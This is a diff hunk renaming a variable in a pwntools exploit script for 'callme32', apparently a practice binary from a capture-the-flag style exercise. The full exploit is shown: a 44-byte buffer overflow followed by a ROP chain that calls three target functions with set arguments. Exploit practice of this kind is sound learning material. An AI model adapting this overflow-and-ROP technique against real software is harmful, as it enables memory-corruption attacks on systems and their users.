@@ -615,17 +615,17 @@ from pwn import *
 
 p = process('./callme32')
 e = ELF('./callme32')
-rop = ROP(e)
+r = ROP(e)
 
 args = [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D]
 
 payload = b'A' * 44
 
-rop.call(e.symbols['callme_one'], args)
-rop.call(e.symbols['callme_two'], args)
-rop.call(e.symbols['callme_three'], args)
+r.call(e.symbols['callme_one'], args)
+r.call(e.symbols['callme_two'], args)
+r.call(e.symbols['callme_three'], args)
 
-payload += rop.chain()
+payload += r.chain()
 
 p.send(payload)
 p.interactive()
